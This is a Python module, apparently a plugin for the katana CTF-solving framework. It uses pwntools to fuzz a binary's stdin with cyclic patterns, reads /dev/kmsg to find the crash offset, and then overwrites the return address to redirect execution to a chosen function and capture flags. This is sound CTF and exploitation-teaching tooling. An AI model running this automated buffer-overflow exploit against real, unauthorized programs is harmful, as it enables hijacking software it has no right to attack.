from pwn import *
import units.binexp
import subprocess

class Unit(units.binexp.BasicBufferOverflowUnit):

	# read /dev/kmsg to find the address that the given pid segfault'd
	def get_segfault_address(self, pid):
		token = '{0}[{1}]: segfault'.format(os.path.basename(self.target), pid)
		fd = os.open('/dev/kmsg', os.O_RDONLY | os.O_NONBLOCK)
		with os.fdopen(fd) as kmsg:
			for line in kmsg:
				if token in line:
					return int(line.split(' ')[5], 16)
		return None

	def __init__(self, katana, parent, target):
		super(Unit, self).__init__(katana, parent, target)
		""" Ensure this binary is exploitable with a direct buffer overflow in STDIN """

		for size in range(16,2048,32):
			try:
				# Create the process
				p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
						stderr=subprocess.PIPE, text=True)

				# Grab the pid
				pid = p.pid

				# Send the input
				(stdout, stderr) = p.communicate(cyclic(size), timeout=katana.config['timeout'])

				# Did we get a segfault?
				if p.returncode == -11:
					address = self.get_segfault_address(p.pid)
					if address is not None:
						try:
							decoded = p32(address & 0xFFFFFFFF).decode('utf-8')
						except:
							pass
						else:
							if cyclic_find(decoded) != -1:
								self.offset = cyclic_find(decoded)
								return


			except subprocess.TimeoutExpired:
				p.kill()
				p.communicate()
				continue

		raise units.NotApplicable()


	def evaluate(self, katana, function):

		payload = b'A'*self.offset + p32(function)
		p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
				stderr=subprocess.PIPE)

		try:
			stdout, stderr = p.communicate(input=payload, timeout=katana.config['timeout'])
			result = p.returncode
		except subprocess.TimeoutExpired:
			p.kill()
			stdout, stderr = p.communicate()
			result = 'execution timed out'

		if p.returncode == -11:
			segaddr = hex(self.get_segfault_address(p.pid))
		else:
			segaddr = None

		stdout = stdout.decode()
		stderr = stderr.decode()

		katana.locate_flags(self, stdout)
		katana.locate_flags(self, stderr)
		katana.recurse(self, stdout)
		katana.recurse(self, stderr)
		katana.add_results(self, {
			'cmdline': self.target,
			'stdin': ''.join([ '\\x{0:02x}'.format(c) if c < 32 or c >= 127 else chr(c) for c in payload]),
			'stdout': stdout,
			'stderr': stderr,
			'result': result,
			'segfaul_addr': segaddr,
			'offset': self.offset,
			'pid': p.pid
		})

		pass